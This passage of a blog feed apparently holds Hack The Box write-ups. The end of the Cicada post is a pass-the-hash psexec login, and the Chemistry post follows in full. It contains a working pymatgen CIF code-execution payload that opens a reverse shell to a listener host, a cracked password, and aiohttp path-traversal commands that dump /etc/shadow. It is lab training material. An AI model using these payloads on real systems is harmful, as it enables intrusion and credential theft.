+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
+└─$ impacket-psexec cicada/Administrator@10.10.11.35 -hashes :2b87e7c93a3e8a0ea4a581937016f341
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.10.11.35.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file XnYvdxik.exe
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.10.11.35.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service noqz on 10.10.11.35.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service noqz.....
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.20348.2700<span style="color:#f92672">]</span>
+<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; 
+
+</code></pre></div><p><img src="attachment/6c4e7fc15c5e909ebca94f90ff258d6e.png" alt=""></p>
+<p>Then get root.txt in <strong>C:\Users\Administrator\Desktop&gt;</strong></p>
+<p><img src="attachment/1b649ffb4e75f05397d31a254f89ee84.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rootflag:03875ddc5ded5559275b9be9ca9d0dd3
+</code></pre></div>]]></content>
+        </item>
+        
+        <item>
+            <title>HTB: Chemistry</title>
+            <link>/posts/chemistry/</link>
+            <pubDate>Fri, 01 Nov 2024 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/chemistry/</guid>
+            <description>Port Scan # Nmap 7.94SVN scan initiated Fri Oct 25 12:20:35 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o port_scan 10.10.11.38 Nmap scan report for 10.10.11.38 Host is up (0.098s latency). Not shown: 986 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA) | 256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA) |_ 256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519) 306/tcp filtered unknown 668/tcp filtered mecomm 1049/tcp filtered td-postman 1112/tcp filtered msql 1247/tcp filtered visionpyramid 1600/tcp filtered issd 1801/tcp filtered msmq 4848/tcp filtered appserv-http 5000/tcp open upnp?</description>
+            <content type="html"><![CDATA[<p><img src="attachment/5094ca779150210b58cfd1f6fafc1088.jpg" alt=""></p>
+<h3 id="port-scan">Port Scan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Nmap 7.94SVN scan initiated Fri Oct 25 12:20:35 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o port_scan 10.10.11.38</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.38
+Host is up <span style="color:#f92672">(</span>0.098s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">986</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+306/tcp   filtered unknown
+668/tcp   filtered mecomm
+1049/tcp  filtered td-postman
+1112/tcp  filtered msql
+1247/tcp  filtered visionpyramid
+1600/tcp  filtered issd
+1801/tcp  filtered msmq
+4848/tcp  filtered appserv-http
+5000/tcp  open     upnp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+|     Server: Werkzeug/3.0.3 Python/3.9.5
+|     Date: Fri, <span style="color:#ae81ff">25</span> Oct <span style="color:#ae81ff">2024</span> 16:20:57 GMT
+|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+|     Content-Length: <span style="color:#ae81ff">719</span>
+|     Vary: Cookie
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+|     &lt;head&gt;
+|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+|     &lt;title&gt;Chemistry - Home&lt;/title&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/styles.css&#34;</span>&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+|     class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;title&#34;</span>&gt;Chemistry CIF Analyzer&lt;/h1&gt;
+|     &lt;p&gt;Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF <span style="color:#f92672">(</span>Crystallographic Information File<span style="color:#f92672">)</span> and analyze the structural data contained within.&lt;/p&gt;
+|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;buttons&#34;</span>&gt;
+|     &lt;center&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span>&gt;Login&lt;/a&gt;
+|     href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/register&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span>&gt;Register&lt;/a&gt;&lt;/center&gt;
+|     &lt;/div&gt;
+|     &lt;/div&gt;
+|     &lt;/body&gt;
+|   RTSPRequest: 
+|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+|     <span style="color:#e6db74">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span>&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request version <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;RTSP/1.0&#39;</span><span style="color:#f92672">)</span>.&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+5633/tcp  filtered beorl
+5915/tcp  filtered unknown
+8291/tcp  filtered unknown
+55555/tcp filtered unknown
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/25%Time<span style="color:#f92672">=</span>671BC560%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%
+SF:r<span style="color:#f92672">(</span>GetRequest,38A,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
+</span><span style="color:#e6db74">SF:\x20Python/3\.9\.5\r\nDate:\x20Fri,\x2025\x20Oct\x202024\x2016:20:57\x2
+</span><span style="color:#e6db74">SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
+</span><span style="color:#e6db74">SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20
+</span><span style="color:#e6db74">SF:html&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=
+</span><span style="color:#e6db74">SF:\&#34;UTF-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;wid
+</span><span style="color:#e6db74">SF:th=device-width,\x20initial-scale=1\.0\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Chemi
+</span><span style="color:#e6db74">SF:stry\x20-\x20Home&lt;/title&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\
+</span><span style="color:#e6db74">SF:x20href=\&#34;/static/styles\.css\&#34;&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\x20\x20\x20\x20\n\x
+</span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20&lt;div\x20class
+</span><span style="color:#e6db74">SF:=\&#34;container\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1\x20class=\&#34;title\&#34;
+</span><span style="color:#e6db74">SF:&gt;Chemistry\x20CIF\x20Analyzer&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;
+</span><span style="color:#e6db74">SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
+</span><span style="color:#e6db74">SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
+</span><span style="color:#e6db74">SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
+</span><span style="color:#e6db74">SF:contained\x20within\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;div\x20clas
+</span><span style="color:#e6db74">SF:s=\&#34;buttons\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;center
+</span><span style="color:#e6db74">SF:&gt;&lt;a\x20href=\&#34;/login\&#34;\x20class=\&#34;btn\&#34;&gt;Login&lt;/a&gt;\n\x20\x20\x20\x20\x20
+</span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20&lt;a\x20href=\&#34;/register\&#34;\x20class=\&#34;btn\&#34;&gt;R
+</span><span style="color:#e6db74">SF:egister&lt;/a&gt;&lt;/center&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;/div&gt;\n\x20\x20\
+</span><span style="color:#e6db74">SF:x20\x20&lt;/div&gt;\n&lt;/body&gt;\n&lt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,1F4,<span style="color:#e6db74">&#34;&lt;!DOCTYPE\x20HTML\x20PUB
+</span><span style="color:#e6db74">SF:LIC\x20\&#34;-//W3C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x20\x20\x
+</span><span style="color:#e6db74">SF:20\x20\&#34;http://www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x20\x20\x
+</span><span style="color:#e6db74">SF:20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&#34;Con
+</span><span style="color:#e6db74">SF:tent-Type\&#34;\x20content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x20\x20\x
+</span><span style="color:#e6db74">SF:20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;
+</span><span style="color:#e6db74">SF:\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20
+</span><span style="color:#e6db74">SF:response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400
+</span><span style="color:#e6db74">SF:&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20
+</span><span style="color:#e6db74">SF:version\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Er
+</span><span style="color:#e6db74">SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
+</span><span style="color:#e6db74">SF:equest\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20
+</span><span style="color:#e6db74">SF:&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>;
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
+TCP/IP fingerprint:
+OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.94SVN%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>10/25%OT<span style="color:#f92672">=</span>22%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>30360%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>T%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span><span style="color:#ae81ff">671</span>
+OS:BC5D9%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>100%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10B%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%
+OS:II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>101%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10C%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>101%GCD<span style="color:#f92672">=</span>1%
+OS:ISR<span style="color:#f92672">=</span>10C%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>D<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M53CST11NW7%O2<span style="color:#f92672">=</span>M53CST11NW7%O3<span style="color:#f92672">=</span>M53CNNT
+OS:11NW7%O4<span style="color:#f92672">=</span>M53CST11NW7%O5<span style="color:#f92672">=</span>M53CST11NW7%O6<span style="color:#f92672">=</span>M53CST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FE88%W2<span style="color:#f92672">=</span>FE88%W3<span style="color:#f92672">=</span>F
+OS:E88%W4<span style="color:#f92672">=</span>FE88%W5<span style="color:#f92672">=</span>FE88%W6<span style="color:#f92672">=</span>FE88<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>FAF0%O<span style="color:#f92672">=</span>M53CNNSNW
+OS:7%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%TG<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A
+OS:<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O
+OS:<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y
+OS:%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%
+OS:RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T
+OS:<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%IPL<span style="color:#f92672">=</span>164%UN
+OS:<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%CD<span style="color:#f92672">=</span>S<span style="color:#f92672">)</span>
+
+Network Distance: <span style="color:#ae81ff">2</span> hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 443/tcp<span style="color:#f92672">)</span>
+HOP RTT      ADDRESS
+<span style="color:#ae81ff">1</span>   93.00 ms 10.10.14.1
+<span style="color:#ae81ff">2</span>   93.29 ms 10.10.11.38
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Fri Oct 25 12:22:49 2024 -- 1 IP address (1 host up) scanned in 133.34 seconds</span>
+
+</code></pre></div><p>On port 5000 after creating an user and login you can see an upload form:
+<img src="attachment/423da4aaa84e1eee68fc2a57325dfc93.png" alt=""></p>
+<p>You can download an example file in .cif format</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">data_Example
+_cell_length_a    <span style="color:#ae81ff">10.00000</span>
+_cell_length_b    <span style="color:#ae81ff">10.00000</span>
+_cell_length_c    <span style="color:#ae81ff">10.00000</span>
+_cell_angle_alpha <span style="color:#ae81ff">90.00000</span>
+_cell_angle_beta  <span style="color:#ae81ff">90.00000</span>
+_cell_angle_gamma <span style="color:#ae81ff">90.00000</span>
+_symmetry_space_group_name_H<span style="color:#f92672">-</span>M <span style="color:#960050;background-color:#1e0010">&#39;</span>P <span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+loop_
+ _atom_site_label
+ _atom_site_fract_x
+ _atom_site_fract_y
+ _atom_site_fract_z
+ _atom_site_occupancy
+ H <span style="color:#ae81ff">0.00000</span> <span style="color:#ae81ff">0.00000</span> <span style="color:#ae81ff">0.00000</span> <span style="color:#ae81ff">1</span>
+ O <span style="color:#ae81ff">0.50000</span> <span style="color:#ae81ff">0.50000</span> <span style="color:#ae81ff">0.50000</span> <span style="color:#ae81ff">1</span>
+</code></pre></div><p>After some searches i found this resource:
+<a href="https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0">https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0</a></p>
+<p>So generate a reverse shell exploit appending these lines to example file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">_space_group_magn.transform_BNS_Pp_abc  <span style="color:#960050;background-color:#1e0010">&#39;</span>a,b,[d <span style="color:#66d9ef">for</span> d in ().__class__.__mro__[<span style="color:#ae81ff">1</span>].__getattribute__ ( <span style="color:#f92672">*</span>[().__class__.__mro__[<span style="color:#ae81ff">1</span>]]<span style="color:#f92672">+</span>[<span style="color:#e6db74">&#34;__sub&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;classes__&#34;</span>]) () <span style="color:#66d9ef">if</span> d.__name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;BuiltinImporter&#34;</span>][<span style="color:#ae81ff">0</span>].load_module (<span style="color:#e6db74">&#34;os&#34;</span>).system (<span style="color:#e6db74">&#34;/bin/bash -c </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">sh -i &gt;&amp; /dev/tcp/10.10.14.57/4444 0&gt;&amp;1</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#34;</span>);<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+_space_group_magn.number_BNS  <span style="color:#ae81ff">62.448</span>
+_space_group_magn.name_BNS  <span style="color:#e6db74">&#34;P  n&#39;  m  a&#39;  &#34;</span>
+</code></pre></div><p>Then upload it on the platform and while listening on specified port click on &ldquo;view&rdquo; button and you will get a reverse shell:
+<img src="attachment/98544c9579f85dbaff4467d330a40405.png" alt=""></p>
+<p>Once in I browsed trough folders and found a .db file in <strong>/instance</strong>:</p>
+<p><img src="attachment/a07416b7d39814bf65a972ab67ce98cb.png" alt=""></p>
+<p>So copy it and store in local to analyze and the go to <a href="https://inloop.github.io/sqlite-viewer/">https://inloop.github.io/sqlite-viewer/</a> to visualize it:
+<img src="attachment/ae5c718a5452b6ba809d75e9acc8f8bb.png" alt=""></p>
+<pre tabindex="0"><code>rosa:63ed86ee9f624c7b14f1d4f43dc251a5
+</code></pre><p>Is an MD5 hashed password, tried to crack it on crackstation:</p>
+<p><img src="attachment/d2fe7632ffcd0ede2092fc06eb355cca.png" alt=""></p>
+<pre tabindex="0"><code>rosa:unicorniosrosados
+</code></pre><p>So let&rsquo;s try to ssh into the machine:
+<img src="attachment/3e53bd91182caf7e0eb31b8d52df7f50.png" alt=""></p>
+<p><img src="attachment/edc77558fb5d6ae50ac9eabb0bb941b2.png" alt=""></p>
+<p>Try to forward the the port 8080 that is not exposed, it has to be an internal service, so forward it trough ssh and browse the page:</p>
+<p><img src="attachment/b3d5c6e7ee201e4bc7fb601a08bfba53.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rosa@chemistry:~$ curl localhost:8080 --head
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+Content-Length: <span style="color:#ae81ff">5971</span>
+Date: Fri, <span style="color:#ae81ff">01</span> Nov <span style="color:#ae81ff">2024</span> 23:43:28 GMT
+Server: Python/3.9 aiohttp/3.9.1
+</code></pre></div><p>The running service is aiohttp 3.9.1, which is vulnerable to directory traversal attack: <strong><a href="https://github.com/ox1111/CVE-2024-23334">CVE-2024-23334</a></strong>
+Through this vulnerability we can get the root flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ curl -s --path-as-is http://localhost:8080/assets/../../../../root/root.txt
+6401b9e5a23e0b20fecead6965d9f51e
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ curl -s --path-as-is http://localhost:8080/assets/../../../../etc/shadow
+root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
+daemon:*:19430:0:99999:7:::
+bin:*:19430:0:99999:7:::
+sys:*:19430:0:99999:7:::
+sync:*:19430:0:99999:7:::
+games:*:19430:0:99999:7:::
+man:*:19430:0:99999:7:::
+lp:*:19430:0:99999:7:::
+mail:*:19430:0:99999:7:::
+news:*:19430:0:99999:7:::
+uucp:*:19430:0:99999:7:::
+proxy:*:19430:0:99999:7:::
+www-data:*:19430:0:99999:7:::
+backup:*:19430:0:99999:7:::
+list:*:19430:0:99999:7:::
+irc:*:19430:0:99999:7:::
+gnats:*:19430:0:99999:7:::
+nobody:*:19430:0:99999:7:::
+systemd-network:*:19430:0:99999:7:::
+systemd-resolve:*:19430:0:99999:7:::
+systemd-timesync:*:19430:0:99999:7:::
+messagebus:*:19430:0:99999:7:::
+syslog:*:19430:0:99999:7:::
+_apt:*:19430:0:99999:7:::
+tss:*:19430:0:99999:7:::
+uuidd:*:19430:0:99999:7:::
+tcpdump:*:19430:0:99999:7:::
+landscape:*:19430:0:99999:7:::
+pollinate:*:19430:0:99999:7:::
+fwupd-refresh:*:19430:0:99999:7:::
+usbmux:*:19889:0:99999:7:::
